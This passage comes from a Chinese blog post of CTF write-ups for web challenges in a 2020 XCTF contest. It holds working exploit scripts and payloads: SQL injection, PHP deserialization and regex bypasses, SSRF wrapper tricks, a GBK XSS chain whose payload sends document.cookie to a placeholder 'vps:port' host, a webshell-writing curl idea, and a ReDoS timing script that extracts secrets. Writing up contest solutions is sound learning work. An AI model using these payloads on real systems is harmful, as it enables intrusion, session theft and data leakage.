src="/2020/03/10/XCTF%E9%AB%98%E6%A0%A1%E6%88%98%E2%80%9C%E7%96%AB%E2%80%9D%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%88%86%E4%BA%AB%E8%B5%9B/3.PNG" alt="date"></p><p>这谁想得到，真的无语。<br>后面一个反序列化的trick,不想多说了。</p><p>好吧，官方wp里发现这题出题人搭在自己服务器上，来复现一波。<br>注入不说了</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> urllib.parse</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line">let=string.ascii_lowercase+<span class="string">"_.()"</span></span><br><span class="line">exp=<span class="string">''</span></span><br><span class="line">payload=<span class="string">"1' union select 1,(select group_concat(passwd) from admin),3#"</span><span class="comment"># /eGlhb2xldW5n</span></span><br><span class="line"><span class="keyword">for</span> ch <span class="keyword">in</span> payload:</span><br><span class="line">    <span class="keyword">if</span> ch <span class="keyword">in</span> let:</span><br><span class="line">        ch=<span class="string">"\\"</span>+ch</span><br><span class="line">    exp+=ch</span><br><span class="line">print(exp)</span><br><span class="line"></span><br><span class="line">url=<span class="string">'http://eqwerqwrfweryu.mycute.cn/?time='</span></span><br><span class="line">r=requests.get(url+urllib.parse.quote(exp))</span><br><span class="line">page=re.findall(<span class="string">r'&lt;div class="text-c "&gt;(.*?)&lt;/div&gt;'</span>,r.text)[<span class="number">0</span>]</span><br><span class="line">print(page)</span><br></pre></td></tr></table></figure><p>然后一个ssrf读源码，file协议加localhost直接读。估计跟hgame week2那题一模一样的后端代码。根据提示读到某个重要php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">trick</span></span>&#123;</span><br><span class="line"><span class="keyword">public</span> $gf;</span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">content_to_file</span><span class="params">($content)</span></span>&#123;</span><br><span class="line">$passwd = $_GET[<span class="string">'pass'</span>];</span><br><span class="line"><span class="keyword">if</span>(preg_match(<span class="string">'/^[a-z]+\.passwd$/m'</span>,$passwd)) </span><br><span class="line">&#123; </span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(strpos($passwd,<span class="string">"20200202"</span>))&#123;</span><br><span class="line"><span class="keyword">echo</span> file_get_contents(<span class="string">"/"</span>.$content);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"> &#125; </span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">aiisc_to_chr</span><span class="params">($number)</span></span>&#123;</span><br><span class="line"><span class="keyword">if</span>(strlen($number)&gt;<span class="number">2</span>)&#123;</span><br><span class="line">$str = <span class="string">""</span>;</span><br><span class="line"> $number = str_split($number,<span class="number">2</span>);</span><br><span class="line"> <span class="keyword">foreach</span> ($number <span class="keyword">as</span> $num ) &#123;</span><br><span class="line"> $str = $str .chr($num);</span><br><span class="line"> &#125;</span><br><span class="line"> <span class="keyword">return</span> strtolower($str);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> chr($number);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">calc</span><span class="params">()</span></span>&#123;</span><br><span class="line">$gf=<span class="keyword">$this</span>-&gt;gf;</span><br><span class="line"><span class="keyword">if</span>(!preg_match(<span class="string">'/[a-zA-z0-9]|\&amp;|\^|#|\$|%/'</span>, $gf))&#123;</span><br><span class="line">  <span class="keyword">eval</span>(<span class="string">'$content='</span>.$gf.<span class="string">';'</span>);</span><br><span class="line">  $content =  <span class="keyword">$this</span>-&gt;aiisc_to_chr($content); </span><br><span class="line">  <span class="keyword">return</span> $content;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;content_to_file(<span class="keyword">$this</span>-&gt;calc());</span><br><span class="line">        </span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">unserialize((base64_decode($_GET[<span class="string">'code'</span>])));</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>属实佩服出题人ascii码都能打错。<br>上面一层换行符绕过password的校验<br><code>a.passwd%0a20200202</code><br>下面有点像php里的构造技巧可以用取反，也可以使用复杂的字符拼接flag大写ascii码的数字。<br>exp</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">class trick&#123;</span><br><span class="line">    public $gf;</span><br><span class="line">&#125;</span><br><span class="line">&#x2F;*</span><br><span class="line">$abc&#x3D;&quot;FLAG&quot;;</span><br><span class="line">for($i&#x3D;0;$i&lt;&#x3D;strlen($abc);$i++)&#123;</span><br><span class="line">    echo(ord($abc[$i]));</span><br><span class="line">&#125;*&#x2F;</span><br><span class="line">#70766571</span><br><span class="line">$o&#x3D;new trick();</span><br><span class="line">$o-&gt;gf&#x3D;&#39;~&#39;.~&#39;70766571&#39;;#~\xC8\xCF\xC8\xC9\xC9\xCA\xC8\xCE</span><br><span class="line">echo(base64_encode(serialize($o)));</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><h1 id="sqlcheckin"><a href="#sqlcheckin" class="headerlink" title="sqlcheckin"></a>sqlcheckin</h1><p>一个变种的万能密码，还居然是个原题。可惜没做过。<br>语句很清晰</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$stmt = $pdo-&gt;prepare(<span class="string">"SELECT username from users where username='$&#123;_POST['username']&#125;' and password='$&#123;_POST['password']&#125;'"</span>);</span><br></pre></td></tr></table></figure><p>这次因为上面那道坑题又查了不少sql注入的资料，中间也学到了一个trick，比如此题payload:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">admin</span><br><span class="line">&#39;-0-&#39;   or    &#39;^0^&#39;     </span><br><span class="line">acdvvadva&#39; &amp;&#39;1 #前面随便一个字符串</span><br><span class="line">都可</span><br></pre></td></tr></table></figure><p>实际就是利用了mysql里字符的特性。比如万能密码<br><code>username=&#39;admin&#39;-0-&#39;&#39;</code>里mysql会把admin转为数字，因为它跟数字运算了。如果这里0换成1相当于<code>username=-1</code>，属于错误。如果换成<code>username=0</code>则直接返回所有结果。<br>同理，这个思路可以带到异或。进一步还可以用在某些过滤较多的盲注下，比如过滤了注释符号时的布尔盲注：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">payload&#x3D;&#39;-(1&#x3D;1)-&#39;    布尔值假</span><br><span class="line">payload&#x3D;&#39;-(1&#x3D;0)-&#39;    布尔值真</span><br><span class="line">...</span><br><span class="line">payload&#x3D;&#39;-(length(database())&#x3D;12)-&#39;</span><br></pre></td></tr></table></figure><h1 id="hackme"><a href="#hackme" class="headerlink" title="hackme"></a>hackme</h1><p>最早做的一道题。其实思路蛮清晰的，但是后来没做了。其实有一部分原因是因为自己最后一步5字命令执行hitcon原题一直没做出来过。迷惑。<br>开始是审计源码，在profile.php中发现有一个session.serialize_handler序列化处理器不同的问题。所以只要把序列化数据写进session并满足他<code>this-&gt;admin=1</code>的条件即可。<br>这题提供了一个现成的可控参数。所以不需要像原来jarvisoj上做的一道题那样构造一个上传写入session.<br>进入profile后可以看到源码是hitcon原题，但是前面加了一层过滤<br>其实就是经典的<code>filtervar+pregmatch</code><br>之前曾经整理过ssrf的经典waf：<a href="https://www.jianshu.com/p/095f233cc9d5" target="_blank" rel="noopener">https://www.jianshu.com/p/095f233cc9d5</a></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">   <span class="keyword">echo</span> <span class="string">"Argument: "</span>.$argv[<span class="number">1</span>].<span class="string">"\n"</span>;</span><br><span class="line">   <span class="comment">// check if argument is a valid URL</span></span><br><span class="line">   <span class="keyword">if</span>(filter_var($argv[<span class="number">1</span>], FILTER_VALIDATE_URL)) &#123;</span><br><span class="line">      <span class="comment">// parse URL</span></span><br><span class="line">      $r = parse_url($argv[<span class="number">1</span>]);</span><br><span class="line">      print_r($r);</span><br><span class="line">      <span class="comment">// check if host ends with google.com</span></span><br><span class="line">      <span class="keyword">if</span>(preg_match(<span class="string">'/google\.com$/'</span>, $r[<span class="string">'host'</span>])) &#123;</span><br><span class="line">         <span class="comment">// get page from URL</span></span><br><span class="line">         exec(<span class="string">'curl -v -s "'</span>.$r[<span class="string">'host'</span>].<span class="string">'"'</span>, $a);</span><br><span class="line">         print_r($a);</span><br><span class="line">      &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">         <span class="keyword">echo</span> <span class="string">"Error: Host not allowed"</span>;</span><br><span class="line">      &#125;</span><br><span class="line">   &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      <span class="keyword">echo</span> <span class="string">"Error: Invalid URL"</span>;</span><br><span class="line">   &#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>当时payload是<code>0://evil.com:80;google.com:80</code><br>但是此题其实跟bytectf的boringcode更像。幸好自己比赛前几天才复现过。具体细节上就是将host的google改为baidu，加了一层data协议的过滤。以及ssrf方式变为<code>file_get_contents()</code><br>注意，原本curl的时候我们是有多解的。但是ssrf换成<code>file_get_contents()</code>请求只有一种普遍的方式就是<code>data://google.com/plain;base64,SSBsb3ZlIFBIUAo=</code><br>host后的内容直接以路径绕过。并且作为请求内容输出。<br>此题过滤了data，与bytectf一致。当时我看到boringcode这题很多战队解决方法是购买域名绕过对host的限制。除此之外还有说用baidu302跳转的，这里显然不行；有说用ftp协议的，我试过也不行。当时还剩下一种解决方法我试了一下发现可以，就是<code>compress.zlib://data:@baidu.com/baidu.com?,echo(scandir(&#39;.&#39;));</code>而且直接从路径获取内容比另一种方法简单许多。</p><p>所以此题直接使用这一方法就能绕过校验了。<br><code>compress.zlib://data:@127.0.0.1/plain;base64,</code><br>后面hitcon的内容不多说。我觉得自己虽然orange的脚本用不出来，其他方法说不定可以。比如把里面的命令换成<code>curl vps ip &gt; a.php</code><br>写入一句话。</p><h1 id="happyvacation"><a href="#happyvacation" class="headerlink" title="happyvacation"></a>happyvacation</h1><p>有意思的题目，就是我payload几乎都完成了结果没做出来。泪流满面。<br>开始第一天发现是个CSP,加上有个文件上传点。直接就猜是xss+cspbypass。结果试了下发现个别参数一堆过滤还有没找到xss的点。第二天才知道有git源码泄露，立马原地复活。<br>比赛时整理的要点</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">1.$message可控，绕过preg_match&#39;&#x2F;coo|&lt;|ja|\&amp;|\\\|&gt;|win&#x2F;i&#39;后</span><br><span class="line">addslashes后存储起来</span><br><span class="line">然后showmessage()里调用了echo &quot;&lt;body&gt;&lt;script&gt; var a &#x3D; &#39;&#123;$this-&gt;info-&gt;message&#125;&#39;;document.write(a);&lt;&#x2F;script&gt;&lt;&#x2F;body&gt;&quot;;</span><br><span class="line"></span><br><span class="line">2.$answer可控</span><br><span class="line">绕过preg_match &quot;&#x2F;[^a-zA-Z_\-&#125;&gt;@\]*]&#x2F;i&quot;跟</span><br><span class="line">&#x2F;f|sy|and|or|j|sc|in&#x2F;i</span><br><span class="line">拼接进eval(eval(&quot;\$this-&gt;&quot;.$answer.&quot; &#x3D; false;&quot;);)</span><br><span class="line"></span><br><span class="line">3.$referer可控</span><br><span class="line">跳转</span><br><span class="line">4.文件上传</span><br><span class="line">禁了[&#39;ph&#39;, &#39;ht&#39;, &#39;sh&#39;, &#39;pe&#39;, &#39;j&#39;, &#39;&#x3D;&#39;, &#39;co&#39;, &#39;\\&#39;, &#39;&quot;&#39;, &#39;\&#39;&#39;]</span><br></pre></td></tr></table></figure><p>这里CSP写的很基本，就是个允许同源脚本，而且开放了unsafe-inline。这种给了文件上传的js就是白给。CSP轻松解决。现在关键是waf。<br>$message是传打xss的语句的。但是过了一层addslashes后被写入语句，意味着必须要解决宽字符的问题。这里如果是常规方法可以在里面再写一个<code>script</code>内容绕过。可是标签被过滤了。只能考虑其他方法。</p><p>$answer应该是要利用的，最终可以实现一个eval语句，但是严格限制我们只能将某个属性置为false。</p><p>lib.php可以看见一段关键函数</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">go</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;pre) <span class="keyword">and</span> <span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;after) <span class="keyword">and</span> <span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;location))&#123;</span><br><span class="line">$dest = <span class="keyword">$this</span>-&gt;pre . <span class="keyword">$this</span>-&gt;location . <span class="keyword">$this</span>-&gt;after;</span><br><span class="line">header($dest);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line"><span class="comment">// Error occured?</span></span><br><span class="line">header(<span class="string">"Location: index.php"</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;flag)&#123;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;location !== <span class="keyword">$this</span>-&gt;page)&#123;</span><br><span class="line"><span class="keyword">$this</span>-&gt;go();</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">ob_end_flush();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>一个<code>destruct</code>方法，在flag为true时会调用<code>go</code>，然后，go很奇妙的拼接了三个参数进行<code>header()</code>设计。<br>那么是否只要我们把header控制为gbk编码，就可以解决前面xss被转义的问题呢？没错。所以这里就是入手点。转而跟进下关键函数。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">if($user-&gt;url-&gt;referer !&#x3D; $user-&gt;url-&gt;page)&#123;</span><br><span class="line">            $user-&gt;url-&gt;location &#x3D; $user-&gt;url-&gt;referer;</span><br><span class="line">        &#125;</span><br><span class="line">        $user-&gt;url-&gt;flag &#x3D; True;</span><br></pre></td></tr></table></figure><p>首先，传值answer时就会进行flag=1赋值，同时location参数会赋值为我们可控的referer。那么我们的目标变成通过referer控制header。<br>为此就要解决<code>pre</code>这个拼接的属性。这时我们前面的eval语句就起作用了。如果把<code>this-&gt;pre</code>设为false,在拼接时它就会变成空。那么我们的可控参数location直接传进header。<br>既然如此，payload就可以构造了：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;?answer&#x3D;user-&gt;url-&gt;pre&amp;referer&#x3D;Content-Type:text&#x2F;html; charset&#x3D;GBK;abc&#x3D;</span><br></pre></td></tr></table></figure><p>此处随便用<code>abc</code>之类的拼接下后面的<code>this-&gt;after</code>属性值.php。<br>这样我们的index.php终于可以打xss了，可以逃逸单引号。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;index.php?message&#x3D;%c0%27; alert(1);&#x2F;&#x2F;</span><br></pre></td></tr></table></figure><p>现在想来我比赛时就是这么打的。但是<code>alert(1)</code>没成，我以为是payload问题就没继续做了…….现在想想实在是拉胯，这个payload就没问题啊，估计是我哪里细节有问题啊，应该继续做下去的，草。<br>然后就是常规问题了，为了解决没有单引号的问题使用string.fromCharCode，这个我也预先想好了这样写payload，居然因为提前放弃没用出来，该打。<br>然后就可以加载内联脚本了。同样很简单，因为CSP的原因吧src设置成上传文件路径即可。这里我看梅子酒学长的文章介绍的是用.wave文件bypassCSP的。不过之前看过文章介绍过jpeg或者其他文件bypassCSP也是可行的。不过需要设计一下文件头。<br>所以payload构造下：<br>上传图片内容</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">aaaaaaaaaaaaaaa&#x2F;*bbbbbbbbbbbbbbbbbbb*&#x2F;&#x3D;&#39;test&#39;;window.open(&#39;http:&#x2F;&#x2F;vps:port&#x2F;?&#39;+document.cookie);</span><br></pre></td></tr></table></figure><p>index.php构造message</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">%c0%<span class="number">27</span>; </span><br><span class="line"><span class="keyword">var</span> x=<span class="built_in">document</span>.createElement(<span class="string">'script'</span>);</span><br><span class="line">x.src=<span class="string">'/upload/xxxxx/test.wave'</span></span><br><span class="line"><span class="built_in">document</span>.body.appendChild(x);<span class="comment">//</span></span><br></pre></td></tr></table></figure><p>最后payload转一下charcode应该就行了。</p><p>这里再膜一下星盟跟Nu1L等等战队的师傅们，整了个巨简单的非预期。上面eval覆盖的地方由于前面调用了一个clone，所以相当于是个新的user。这样的话user的属性都可以改。由于源码所有功能都在user类实现的，那就是任意属性都可改。直接把黑名单覆盖成false.然后上传phpgetshell。flag在根目录……<br>郁师傅最后也跟我说这个思路，我开始还不敢信。结果真能整成非预期。可惜后来被修复了。</p><p>不说了，比赛没做出来太遗憾了。有复现环境的话一定去复现。</p><h1 id="guessgame"><a href="#guessgame" class="headerlink" title="guessgame"></a>guessgame</h1><p>先扔一个源码审完就出的payload</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&quot;user&quot;: &#123;&quot;username&quot;:&quot;admın888&quot;, &quot;__proto__&quot;: &#123;&quot;enableReg&quot;: True&#125;&#125;&#125;)</span><br></pre></td></tr></table></figure><p>主要是一个js大写的绕过，上次公益CTF做过了。然后是一个调用了merge的原型链污染。也是为了进下面这个if。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(config.enableReg &amp;&amp; noDos(regExp) &amp;&amp; flag.match(regExp))&#123;</span><br><span class="line">            <span class="comment">//res.end(flag);</span></span><br><span class="line">            <span class="comment">//Stop your wishful thinking and go away!</span></span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure><p>后面要跑flag，用的是正则盲注。<br>打扰了，环境一个个卡的一比。我也不知道怎么注，<del>等一手官方wp吧。</del><br>看到别队思路了，可以学下。原来noDos这个正则就是要利用的。因为是个正则匹配，而javascript正则的回溯机制会让恶意代码使服务端大量占用服务内存。比如一个<code>/ˆa*a*b$/</code>，用<code>aaaaaaaaaaaaa</code>就可以让其多次回溯，达成js的re(正则)dos攻击。<br>所以本题目的就是让nodos被我们的可控q卡住，然后前面已经原型链污染达成if的一个真值了，剩下的相当于盲注flag使if第三个值达成真值。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"> g3t(((((.*)+)+)+)+)! </span><br><span class="line">(((((.*)+)+)+)+)Y</span><br></pre></td></tr></table></figure><p>类似如此的payload不断fuzz。</p><p>3.13：<br>今天把题目复现了一下，用的出题人的脚本做了做。顺便理解了下reDOS盲注的基本概念。当然要跟出题人点赞，这题算是头一次考察了reDOS的知识点，可惜因为靶机原因不能保证选手们正常解题。如果单独下发容器应该会更稳定。<br>关于知识点:<br>说起来其实不难。reDOS首先需要明确的是：使用了js的NFA作为正则引擎。NFA，即非确定有限状态自动机。其实，之前在p牛的pcrewaf这一题目中就已经提及了NFA的特性。它正则匹配时出现的回溯机制将会产生大量危害。对php而言是回溯次数有限导致bypass。对作为服务端的js而言，则是占用大量系统资源。之前曾看到国外大佬写的一个正则，可以让一次js的正则匹配占用高达%99的内存。</p><p>回到这一知识点，来看解题的主要正则</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">^(?&#x3D;(some regexp here))((.*)*)*salt$</span><br></pre></td></tr></table></figure><p>简单解释，只要我们所需要的SECRET(本题是flag)与中间的regexp部分相匹配，整个正则将导致整个匹配过程延时到2秒多的时间。既然如此，只要能通过构造正则表达式来注入，将达到跟sql时间盲注一样的效果，得到进行正则匹配的flag<br>附上出题人的exp:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line"><span class="comment"># constants</span></span><br><span class="line">THRESHOLD = <span class="number">2</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># predicates</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">length_is</span><span class="params">(n)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">".&#123;"</span> + str(n) + <span class="string">"&#125;$"</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">nth_char_is</span><span class="params">(n, c)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">".&#123;"</span> + str(n<span class="number">-1</span>) + <span class="string">"&#125;"</span> + re.escape(c) + <span class="string">".*$"</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># utilities</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">redos_if</span><span class="params">(regexp, salt)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">"^(?=&#123;&#125;)((((.*)*)*)*)*&#123;&#125;"</span>.format(regexp, salt)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_request_duration</span><span class="params">(payload)</span>:</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        _start = time.time()</span><br><span class="line">        requests.post(<span class="string">"http://vps:port/verifyFlag"</span>, &#123;<span class="string">"q"</span>: payload&#125;)</span><br><span class="line">        _end = time.time()</span><br><span class="line">        duration = _end - _start</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        duration = <span class="number">-1</span></span><br><span class="line">        exit(<span class="number">1</span>)</span><br><span class="line">    <span class="keyword">return</span> duration</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">prop_holds</span><span class="params">(prop, salt)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> get_request_duration(redos_if(prop, salt)) &gt; THRESHOLD</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">generate_salt</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">''</span>.join([random.choice(string.ascii_letters) <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">10</span>)])</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    salt = <span class="string">"!"</span>  <span class="comment"># generate_salt()</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># leak length</span></span><br><span class="line">    upper_bound = <span class="number">15</span></span><br><span class="line">    secret_length = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>, upper_bound):</span><br><span class="line">        <span class="keyword">if</span> prop_holds(length_is(i), salt):</span><br><span class="line">            secret_length = i</span><br><span class="line">    print(<span class="string">"[+] length: &#123;&#125;"</span>.format(secret_length))</span><br><span class="line"></span><br><span class="line">    S = <span class="string">"qwdfkjurlasetghnioyzxcvbpmQWDFKJURLASETGHNIOYZXCVBPM1234567890"</span></span><br><span class="line">    secret = <span class="string">""</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>, secret_length):</span><br><span class="line">        <span class="keyword">for</span> c <span class="keyword">in</span> S:</span><br><span class="line">            <span class="keyword">if</span> prop_holds(nth_char_is(i+<span class="number">1</span>, c), salt):</span><br><span class="line">                secret += c</span><br><span class="line">                print(<span class="string">"[*] &#123;&#125;"</span>.format(secret))</span><br><span class="line">    print(<span class="string">"[+] secret: &#123;&#125;"</span>.format(secret))</span><br></pre></td></tr></table></figure><p>参考了出题人的参考文章：<a 